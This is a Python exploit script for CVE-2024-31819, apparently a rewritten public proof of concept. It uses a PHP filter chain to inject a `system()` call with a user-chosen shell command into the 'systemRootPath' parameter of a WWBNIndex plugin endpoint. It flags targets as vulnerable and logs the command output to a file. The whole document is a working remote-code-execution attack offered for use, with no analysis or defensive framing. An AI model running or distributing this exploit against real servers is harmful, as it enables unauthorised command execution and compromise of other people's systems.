#!/bin/env python3


import requests
from php_filter_chain import PHPFilterChainGenerator
from colorama import Fore, Style
import argparse
import threading
import sys

print(Fore.YELLOW + Style.BRIGHT +f'\nCVE-2024-31819\nRewritten:Jhonson' + Style.RESET_ALL+'\n\n') 



def main(target,payload,header,path):

 try:
    generator=PHPFilterChainGenerator()
    
    function=generator.generate_filter_chain(code)
    response = requests.post(f'{target}{path}',data={"systemRootPath":function},headers=header,verify=False,timeout=20)
    if response.status_code == 200:
       r = response.text
       line = r.split('\n', 1)[0]
       print(Fore.GREEN + Style.BRIGHT +target + Style.RESET_ALL+ ' is vulnerable')
       with open('output.txt','a') as file:
               file.write(target+'\n'+line)
               print(Fore.BLUE + Style.BRIGHT +'file save output.txt'+ Style.RESET_ALL)

                

    else :

       print(Fore.RED + Style.BRIGHT +target + Style.RESET_ALL+' is no vulnerable') 
  
 except requests.exceptions.ConnectionError:
            print(Fore.BLUE + Style.BRIGHT +target+f' DNS problem or data connexion' + Style.RESET_ALL) 
             
            
 except requests.exceptions.MissingSchema:
       print('')


if __name__=='__main__':

         
         headers = {"Content-Type": "application/x-www-form-urlencoded"}

         
         parser = argparse.ArgumentParser(description="CVE-2024-31819")
         parser.add_argument("-url", "--url", dest="url", help="Single url", required=False)     
         parser.add_argument("-cmd", "--cmd", dest="cmd", help="command execution", required=False) 
         args = parser.parse_args()

         cmd=args.cmd
         code = f"<?php echo '[S]';system('{cmd}');echo '[E]';?>"
         


         main(args.url,code,headers,'/plugin/WWBNIndex/submitIndex.php')
